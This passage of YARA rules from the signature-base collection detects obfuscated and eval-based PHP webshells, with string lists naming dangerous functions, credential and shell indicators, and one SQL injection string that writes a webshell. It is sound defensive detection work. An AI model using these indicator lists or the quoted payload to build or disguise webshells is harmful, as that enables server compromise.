		filesize <700KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and any of ($mix*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_Tiny : FILE {
    meta:
		description = "PHP webshell obfuscated"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d78e495f-54d2-5f5f-920f-fb6612afbca3"
		date = "2021-01-12"
		modified = "2024-03-11"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1248-L1343"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b7b7aabd518a2f8578d4b1bc9a3af60d155972f1"
		hash = "694ec6e1c4f34632a9bd7065f73be473"
		hash = "5c871183444dbb5c8766df6b126bd80c624a63a16cc39e20a0f7b002216b2ba5"
		logic_hash = "993f1c98362dcbc207c6ceacb116a27d44505dc6dfa1874def780af50422e1b9"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$obf1 = /\w'\.'\w/ wide ascii
		$obf2 = /\w\"\.\"\w/ wide ascii
		$obf3 = "].$" wide ascii
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii

	condition:
		filesize <500 and not ( any of ($gfp*)) and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and ( any of ($cpayload*) or all of ($m_cpayload_preg_filter*)) and ((#obf1+#obf2)>2 or #obf3>10)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_Str_Replace : FILE {
    meta:
		description = "PHP webshell which eval()s obfuscated string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1f5b93c9-bdeb-52c7-a99a-69869634a574"
		date = "2021-01-12"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1345-L1400"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "691305753e26884d0f930cda0fe5231c6437de94"
		hash = "7efd463aeb5bf0120dc5f963b62463211bd9e678"
		hash = "fb655ddb90892e522ae1aaaf6cd8bde27a7f49ef"
		hash = "d1863aeca1a479462648d975773f795bb33a7af2"
		hash = "4d31d94b88e2bbd255cf501e178944425d40ee97"
		hash = "e1a2af3477d62a58f9e6431f5a4a123fb897ea80"
		logic_hash = "74fb86a7ee7342ede9f49ef004a92fb7bdf06ca62f8e8f0ea1c6adcff96bcb2d"
		score = 75
		quality = 46
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload1 = "str_replace" fullword wide ascii
		$payload2 = "function" fullword wide ascii
		$goto = "goto" fullword wide ascii
		$chr1 = "\\61" wide ascii
		$chr2 = "\\112" wide ascii
		$chr3 = "\\120" wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <300KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and any of ($payload*) and #goto>1 and (#chr1>10 or #chr2>10 or #chr3>10)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_Fopo : FILE {
    meta:
		description = "PHP webshell which eval()s obfuscated string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "a298e99d-1ba8-58c8-afb9-fc988ea91e9a"
		date = "2021-01-12"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1402-L1462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fbcff8ea5ce04fc91c05384e847f2c316e013207"
		hash = "6da57ad8be1c587bb5cc8a1413f07d10fb314b72"
		hash = "a698441f817a9a72908a0d93a34133469f33a7b34972af3e351bdccae0737d99"
		logic_hash = "076c0c256e5951cdcb2b7bc55030f55bec48c1bea953b8bd85559a3230e387ae"
		score = 75
		quality = 40
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload = /(\beval[\t ]{0,500}\([^)]|\bassert[\t ]{0,500}\([^)])/ nocase wide ascii
		$one1 = "7QGV2YWwo" wide ascii
		$one2 = "tAZXZhbC" wide ascii
		$one3 = "O0BldmFsK" wide ascii
		$one4 = "sAQABlAHYAYQBsACgA" wide ascii
		$one5 = "7AEAAZQB2AGEAbAAoA" wide ascii
		$one6 = "OwBAAGUAdgBhAGwAKA" wide ascii
		$two1 = "7QGFzc2VydC" wide ascii
		$two2 = "tAYXNzZXJ0K" wide ascii
		$two3 = "O0Bhc3NlcnQo" wide ascii
		$two4 = "sAQABhAHMAcwBlAHIAdAAoA" wide ascii
		$two5 = "7AEAAYQBzAHMAZQByAHQAKA" wide ascii
		$two6 = "OwBAAGEAcwBzAGUAcgB0ACgA" wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <3000KB and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and $payload and ( any of ($one*) or any of ($two*))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Gzinflated : FILE {
    meta:
		description = "PHP webshell which directly eval()s obfuscated string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "9cf99ae4-9f7c-502f-9294-b531002953d6"
		date = "2021-01-12"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1464-L1537"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "49e5bc75a1ec36beeff4fbaeb16b322b08cf192d"
		hash = "6f36d201cd32296bad9d5864c7357e8634f365cc"
		hash = "ab10a1e69f3dfe7c2ad12b2e6c0e66db819c2301"
		hash = "a6cf337fe11fe646d7eee3d3f09c7cb9643d921d"
		hash = "07eb6634f28549ebf26583e8b154c6a579b8a733"
		logic_hash = "d2edb7050c986a00889fd01b709ec0aa1409ce2e40a15b7942562d12596b190e"
		score = 75
		quality = 32
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload2 = /eval\s?\(\s?("\?>".)?gzinflate\s?\(\s?base64_decode\s?\(/ wide ascii nocase
		$payload4 = /eval\s?\(\s?("\?>".)?gzuncompress\s?\(\s?(base64_decode|gzuncompress)/ wide ascii nocase
		$payload6 = /eval\s?\(\s?("\?>".)?gzdecode\s?\(\s?base64_decode\s?\(/ wide ascii nocase
		$payload7 = /eval\s?\(\s?base64_decode\s?\(/ wide ascii nocase
		$payload8 = /eval\s?\(\s?pack\s?\(/ wide ascii nocase
		$fp1 = "YXBpLnRlbGVncmFtLm9"
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <700KB and not ( any of ($gfp*)) and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and 1 of ($payload*) and not any of ($fp*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_OBFUSC_3 : FILE {
    meta:
		description = "PHP webshell which eval()s obfuscated string"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "f2017e6f-0623-53ff-aa26-a479f3a02024"
		date = "2021-04-17"
		modified = "2024-03-11"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1539-L1844"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "11bb1fa3478ec16c00da2a1531906c05e9c982ea"
		hash = "d6b851cae249ea6744078393f622ace15f9880bc"
		hash = "14e02b61905cf373ba9234a13958310652a91ece"
		hash = "6f97f607a3db798128288e32de851c6f56e91c1d"
		logic_hash = "904deddb937c39cd5aab3cdeccb8101e87c909a70f52bed1c9f7e3e4c923e685"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$obf1 = "chr(" wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$callback1 = /\bob_start[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback2 = /\barray_diff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback3 = /\barray_diff_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback4 = /\barray_filter[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback5 = /\barray_intersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback6 = /\barray_intersect_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback7 = /\barray_map[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback8 = /\barray_reduce[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback9 = /\barray_udiff_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback10 = /\barray_udiff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback11 = /\barray_udiff[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback12 = /\barray_uintersect_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback13 = /\barray_uintersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback14 = /\barray_uintersect[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback15 = /\barray_walk_recursive[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback16 = /\barray_walk[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback17 = /\bassert_options[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback18 = /\buasort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback19 = /\buksort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback20 = /\busort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback21 = /\bpreg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback22 = /\bspl_autoload_register[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback23 = /\biterator_apply[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback24 = /\bcall_user_func[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback25 = /\bcall_user_func_array[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback26 = /\bregister_shutdown_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback27 = /\bregister_tick_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback28 = /\bset_error_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback29 = /\bset_exception_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback30 = /\bsession_set_save_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback31 = /\bsqlite_create_aggregate[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback32 = /\bsqlite_create_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback33 = /\bmb_ereg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$m_callback1 = /\bfilter_var[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$m_callback2 = "FILTER_CALLBACK" fullword wide ascii
		$cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
		$cfp2 = "IWPML_Backend_Action_Loader" ascii wide
		$cfp3 = "<?phpclass WPML" ascii
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
		$cobfs1 = "gzinflate" fullword nocase wide ascii
		$cobfs2 = "gzuncompress" fullword nocase wide ascii
		$cobfs3 = "gzdecode" fullword nocase wide ascii
		$cobfs4 = "base64_decode" fullword nocase wide ascii
		$cobfs5 = "pack" fullword nocase wide ascii
		$cobfs6 = "undecode" fullword nocase wide ascii
		$gen_bit_sus1 = /:\s{0,20}eval}/ nocase wide ascii
		$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase wide ascii
		$gen_bit_sus6 = "self.delete"
		$gen_bit_sus9 = "\"cmd /c" nocase
		$gen_bit_sus10 = "\"cmd\"" nocase
		$gen_bit_sus11 = "\"cmd.exe" nocase
		$gen_bit_sus12 = "%comspec%" wide ascii
		$gen_bit_sus13 = "%COMSPEC%" wide ascii
		$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
		$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
		$gen_bit_sus21 = "\"upload\"" wide ascii
		$gen_bit_sus22 = "\"Upload\"" wide ascii
		$gen_bit_sus23 = "UPLOAD" fullword wide ascii
		$gen_bit_sus24 = "fileupload" wide ascii
		$gen_bit_sus25 = "file_upload" wide ascii
		$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
		$gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
		$gen_bit_sus30 = "serv-u" wide ascii
		$gen_bit_sus31 = "Serv-u" wide ascii
		$gen_bit_sus32 = "Army" fullword wide ascii
		$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
		$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
		$gen_bit_sus35 = "crack" fullword wide ascii
		$gen_bit_sus44 = "<pre>" wide ascii
		$gen_bit_sus45 = "<PRE>" wide ascii
		$gen_bit_sus46 = "shell_" wide ascii
		$gen_bit_sus50 = "bypass" wide ascii
		$gen_bit_sus52 = " ^ $" wide ascii
		$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
		$gen_bit_sus55 = /\w'\.'\w/ wide ascii
		$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
		$gen_bit_sus57 = "dumper" wide ascii
		$gen_bit_sus59 = "'cmd'" wide ascii
		$gen_bit_sus60 = "\"execute\"" wide ascii
		$gen_bit_sus61 = "/bin/sh" wide ascii
		$gen_bit_sus62 = "Cyber" wide ascii
		$gen_bit_sus63 = "portscan" fullword wide ascii
		$gen_bit_sus66 = "whoami" fullword wide ascii
		$gen_bit_sus67 = "$password='" fullword wide ascii
		$gen_bit_sus68 = "$password=\"" fullword wide ascii
		$gen_bit_sus69 = "$cmd" fullword wide ascii
		$gen_bit_sus70 = "\"?>\"." fullword wide ascii
		$gen_bit_sus71 = "Hacking" fullword wide ascii
		$gen_bit_sus72 = "hacking" fullword wide ascii
		$gen_bit_sus73 = ".htpasswd" wide ascii
		$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
		$gen_much_sus7 = "Web Shell" nocase
		$gen_much_sus8 = "WebShell" nocase
		$gen_much_sus3 = "hidded shell"
		$gen_much_sus4 = "WScript.Shell.1" nocase
		$gen_much_sus5 = "AspExec"
		$gen_much_sus14 = "\\pcAnywhere\\" nocase
		$gen_much_sus15 = "antivirus" nocase
		$gen_much_sus16 = "McAfee" nocase
		$gen_much_sus17 = "nishang"
		$gen_much_sus18 = "\"unsafe" fullword wide ascii
		$gen_much_sus19 = "'unsafe" fullword wide ascii
		$gen_much_sus24 = "exploit" fullword wide ascii
		$gen_much_sus25 = "Exploit" fullword wide ascii
		$gen_much_sus26 = "TVqQAAMAAA" wide ascii
		$gen_much_sus30 = "Hacker" wide ascii
		$gen_much_sus31 = "HACKED" fullword wide ascii
		$gen_much_sus32 = "hacked" fullword wide ascii
		$gen_much_sus33 = "hacker" wide ascii
		$gen_much_sus34 = "grayhat" nocase wide ascii
		$gen_much_sus35 = "Microsoft FrontPage" wide ascii
		$gen_much_sus36 = "Rootkit" wide ascii
		$gen_much_sus37 = "rootkit" wide ascii
		$gen_much_sus38 = "/*-/*-*/" wide ascii
		$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
		$gen_much_sus40 = "\"e\"+\"v" wide ascii
		$gen_much_sus41 = "a\"+\"l\"" wide ascii
		$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
		$gen_much_sus43 = "q\"+\"u\"" wide ascii
		$gen_much_sus44 = "\"u\"+\"e" wide ascii
		$gen_much_sus45 = "/*//*/" wide ascii
		$gen_much_sus46 = "(\"/*/\"" wide ascii
		$gen_much_sus47 = "eval(eval(" wide ascii
		$gen_much_sus48 = "unlink(__FILE__)" wide ascii
		$gen_much_sus49 = "Shell.Users" wide ascii
		$gen_much_sus50 = "PasswordType=Regular" wide ascii
		$gen_much_sus51 = "-Expire=0" wide ascii
		$gen_much_sus60 = "_=$$_" wide ascii
		$gen_much_sus61 = "_=$$_" wide ascii
		$gen_much_sus62 = "++;$" wide ascii
		$gen_much_sus63 = "++; $" wide ascii
		$gen_much_sus64 = "_.=$_" wide ascii
		$gen_much_sus70 = "-perm -04000" wide ascii
		$gen_much_sus71 = "-perm -02000" wide ascii
		$gen_much_sus72 = "grep -li password" wide ascii
		$gen_much_sus73 = "-name config.inc.php" wide ascii
		$gen_much_sus75 = "password crack" wide ascii
		$gen_much_sus76 = "mysqlDll.dll" wide ascii
		$gen_much_sus77 = "net user" wide ascii
		$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
		$gen_much_sus81 = /strrev\(['"]/ wide ascii
		$gen_much_sus82 = "PHPShell" fullword wide ascii
		$gen_much_sus821 = "PHP Shell" fullword wide ascii
		$gen_much_sus83 = "phpshell" fullword wide ascii
		$gen_much_sus84 = "PHPshell" fullword wide ascii
		$gen_much_sus87 = "deface" wide ascii
		$gen_much_sus88 = "Deface" wide ascii
		$gen_much_sus89 = "backdoor" wide ascii
		$gen_much_sus90 = "r00t" fullword wide ascii
		$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
		$gen_much_sus92 = "base64_decode(base64_decode(" fullword wide ascii
		$gen_much_sus93 = "eval(\"/*" wide ascii
		$gen_much_sus94 = "=$_COOKIE;" wide ascii
		$gif = { 47 49 46 38 }

	condition:
		((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and (( not any of ($cfp*) and ( any of ($callback*) or all of ($m_callback*))) or ( any of ($cpayload*) or all of ($m_cpayload_preg_filter*))) and ( any of ($cobfs*)) and ( filesize <1KB or ( filesize <3KB and (($gif at 0 or ( filesize <4KB and (1 of ($gen_much_sus*) or 2 of ($gen_bit_sus*))) or ( filesize <20KB and (2 of ($gen_much_sus*) or 3 of ($gen_bit_sus*))) or ( filesize <50KB and (2 of ($gen_much_sus*) or 4 of ($gen_bit_sus*))) or ( filesize <100KB and (2 of ($gen_much_sus*) or 6 of ($gen_bit_sus*))) or ( filesize <150KB and (3 of ($gen_much_sus*) or 7 of ($gen_bit_sus*))) or ( filesize <500KB and (4 of ($gen_much_sus*) or 8 of ($gen_bit_sus*)))) or #obf1>10)))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Includer_Eval : FILE {
    meta:
		description = "PHP webshell which eval()s another included file"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "995fcc34-f91e-5c9c-97b1-84eed1714d40"
		date = "2021-01-13"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1846-L1895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3a07e9188028efa32872ba5b6e5363920a6b2489"
		hash = "ab771bb715710892b9513b1d075b4e2c0931afb6"
		hash = "202dbcdc2896873631e1a0448098c820c82bcc8385a9f7579a0dc9702d76f580"
		hash = "b51a6d208ec3a44a67cce16dcc1e93cdb06fe150acf16222815333ddf52d4db8"
		logic_hash = "a7e9632c495e5d4cc883e2593c8ebe41cdf6a18b54bd6dfd3aec85352f19321c"
		score = 75
		quality = 46
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload1 = "eval" fullword wide ascii
		$payload2 = "assert" fullword wide ascii
		$include1 = "$_FILE" wide ascii
		$include2 = "include" wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <200 and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and 1 of ($payload*) and 1 of ($include*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Includer_Tiny : FILE {
    meta:
		description = "Suspicious: Might be PHP webshell includer, check the included file"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "9bf96ddc-d984-57eb-9803-0b01890711b5"
		date = "2021-04-17"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1897-L1942"
